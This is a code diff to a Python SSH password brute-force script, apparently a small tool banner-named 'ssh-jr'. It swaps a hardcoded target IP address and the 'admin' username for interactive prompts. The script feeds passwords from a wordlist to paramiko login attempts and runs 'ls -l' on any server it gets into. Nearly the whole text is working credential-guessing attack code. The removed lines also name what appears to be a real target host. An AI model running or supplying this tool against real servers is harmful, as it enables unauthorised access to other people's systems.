@@ -1,19 +1,36 @@
 import paramiko
 
-hostname = '20.205.18.148'
-username = 'admin'
-wordlistPath = './wor'
+def print_banner():
+    banner = r"""
+              .__                   __        
+  ______ _____|  |__               |__|______ 
+ /  ___//  ___/  |  \   ______     |  \_  __ \
+ \___ \ \___ \|   Y  \ /_____/     |  ||  | \/
+/____  >____  >___|  /         /\__|  ||__|   
+     \/     \/     \/          \______|       
+"""
+    print(banner)
 
-wordListFile = open("wordlist.txt", "r", encoding="utf-8", errors="ignore")
-words = [line.strip() for line in wordListFile]
+print_banner()
+
+
+hostname = input("Enter hostname or IP: ")
+username = input("Enter username: ")
+wordlistPath = input("Enter path to wordlist file: ")
+
+with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as wordListFile:
+    words = [line.strip() for line in wordListFile]
 
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 i = 0
 while True:
-    password = words[i]
+    if i >= len(words):
+        print("Looped through wordlist")
+        break
     try:
+        password = words[i]
         client.connect(hostname, username=username, password=password)
         stdin, stdout, stderr = client.exec_command('ls -l')
         output = stdout.read().decode('utf-8')
@@ -32,5 +49,4 @@ while True:
         print(f"An unexpected error occurred: {e}")
     finally:
         client.close()
-        wordListFile.close()
     i += 1
